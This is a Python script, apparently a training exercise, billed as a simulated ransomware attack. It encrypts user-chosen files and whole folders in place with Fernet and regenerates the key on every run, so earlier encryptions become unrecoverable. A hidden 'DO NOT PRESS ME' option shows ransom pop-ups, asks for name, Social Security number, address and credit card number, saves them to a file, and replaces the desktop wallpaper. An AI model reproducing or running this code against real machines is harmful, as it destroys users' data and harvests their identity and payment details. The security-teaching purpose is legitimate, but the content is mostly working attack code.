#!/usr/bin/env python3

# Script: Ops Challenge 06 File Encryption
# Author: Ray Caoagdan
# Date of Last Revision: 07/19//2021
# Purpose: Encryption with Python | Create a Simulated RansomWare Attack


##############################################################################
# Import Library 
##############################################################################
import base64 
import os
import pyautogui
import ctypes 
from os import path
from cryptography.fernet import Fernet 

##############################################################################
# Main Menu Fuction
##############################################################################
def main_menu():
    print (" ")
    print ("What would you like to do? ")
    print("1.Encrypt a File")
    print("2.Decrypt a File")
    print("3.Encrypt a Folder")
    print("4.Decrypt a Folder")
    print("5.Enrypt a message")
    print("6.Decrypt a messsage")
    print("7.DO NOT PRESS ME")
    print("8.Exit")
    mainResponse = input("Desired Request:")
    if mainResponse == '1':
        fileEncryption()
    elif mainResponse == '2':
        fileDecryption()
    elif mainResponse== '3':
        folderEncrypt()
    elif mainResponse == '4':
        folderDecrypt()
    elif mainResponse == '5':
        msgEncryption()
    elif mainResponse == '6':
        msgDecryption()
    elif mainResponse == '7':
        yourPCisMine()
    elif mainResponse == '8':
        exit
    else:
        print("Incorrect selection made")
        main_menu()

##############################################################################
# Key Generation 
##############################################################################
def writeKey():
    key = Fernet.generate_key()
    with open('filekey.key','wb') as key_file:
        key_file.write(key)

##############################################################################
# loads key
##############################################################################
def loadKey():
   return open('filekey.key', 'rb').read()

##############################################################################
# keys to be used in fuctions
##############################################################################
writeKey()
key=loadKey()
fK=Fernet(key)

##############################################################################
# File Encryption 
##############################################################################
def fileEncryption():
    print("FILE ENCRPYTION \n")
    filePath = input("File to Encrpyt:")
    with open(filePath, 'rb') as file:
        originalFile = file.read()
    eFile = fK.encrypt(originalFile)
    with open(filePath,'wb') as encryptedFile:
        encryptedFile.write(eFile)
    encryptedFile.close()
    main_menu()

##############################################################################
# File Decryption
##############################################################################
def fileDecryption():
    print("FILE DECRYPTION \n")
    filePath = input("File to Decrypt:")
    with open(filePath, 'rb') as enc_File:
        originalFile = enc_File.read()
    dFile = fK.decrypt(originalFile)
    with open(filePath,'wb') as dec_File:
        dec_File.write(dFile)
    dec_File.close()
    main_menu()

##############################################################################
# Folder Encryption
##############################################################################
def folderEncrypt():
    print("Folder Encryption \n")
    folderInput = input("Folder to Encrypt:")
    for filename in os.listdir(folderInput):
        files = os.path.join(folderInput,filename)
        with open(files,'rb') as f:
            enc_data=f.read()
        eData = fK.encrypt(enc_data)
        with open(files,'wb') as eF:
            eF.write(eData)
        eF.close()
    main_menu()

##############################################################################
# Folder Decryption
##############################################################################
def folderDecrypt():
    print("Folder Decryption \n")
    folderInput = input("Folder to Encrypt:")
    for filename in os.listdir(folderInput):
        files = os.path.join(folderInput,filename)
        with open(files,'rb') as f:
            original_data=f.read()
        dec_Folder = fK.decrypt(original_data)
        with open(files,'wb') as dF:
            dF.write(dec_Folder)
        dF.close()
    main_menu()

##############################################################################
# Message Encryption
##############################################################################
def msgEncryption():
    print(" ")
    print("Message Encryption \n")
    user_msg = input("MESSAGE TO ENCRYPT:")
    msg_bytes = user_msg.encode('ascii')
    encodedMSG=base64.b64encode(msg_bytes)
    print(" ")
    print("Encoded Message:")
    print(encodedMSG)
    main_menu()

##############################################################################
# Message Decryption
##############################################################################
def msgDecryption():
    print(" ")
    print("Message Decryption \n")
    udmsg = input("MESSAGE TO DECRYPT:")
    b64_bytes = udmsg.encode('ascii')
    msg_bytes = base64.b64decode(b64_bytes)
    oMsg=msg_bytes.decode('ascii')
    print(" ")
    print(oMsg)
    print("Decrypted Message:")
    main_menu()

##############################################################################
# Ransomware
##############################################################################
def yourPCisMine():
    print(" ")
    ransomTile=("YOUR PC IS NOW MINE")
    pyautogui.alert('I Warned You Not To Press Me',ransomTile)
    pyautogui.alert('Now You Must Face the Consequences',ransomTile)
    pyautogui.alert('I now control your PC',ransomTile)
    ransomPC=pyautogui.confirm('DO YOU WANT IT BACK?',ransomTile,['YES','NO'])
    if ransomPC == 'YES':
        pyautogui.alert('Excellent',ransomTile)
        ransomSend()
    else:
        pyautogui.alert('Uhh... Okay then',ransomTile)
    ransomWall()

def ransomSend():
    userFname=pyautogui.prompt("What is your First Name:")
    userLname=pyautogui.prompt("What is your Last Name:")
    userSocial=pyautogui.prompt("What is your Social Security Number")
    userAddress=pyautogui.prompt("What is your Address:")
    userCC=pyautogui.prompt("What is your Credit Card Number:")
    userFULLNAME=(userFname+" "+ userLname)
    userInfo=[userFULLNAME,userSocial,userAddress,userCC]
    with open('ransom.txt','w') as ransomTxt:
        for userInput in userInfo:
            ransomTxt.write('%s\n' % userInput)
    ransomTxt.close()

def ransomWall():
    ransomIMG='C:/Users/rcaoa/OneDrive/Documents/Ops401/anon.jpg'
    ctypes.windll.user32.SystemParametersInfoW(20,0,ransomIMG,0)

##############################################################################
# Main
##############################################################################
main_menu()
##############################################################################
# End
##############################################################################


##########################################################################################
# Sources
##########################################################################################
## https://stackabuse.com/encoding-and-decoding-base64-strings-in-python
## https://www.thepythoncode.com/article/encrypt-decrypt-files-symmetric-python
## https://pypi.org/project/cryptography/

##OS PATH
## https://careerkarma.com/blog/python-os-path-join/ 

## Python Wallpaper
# https://dev.to/matin/change-your-windows-background-by-running-a-python-script-281p
##########################################################################################
# End Sources 
##########################################################################################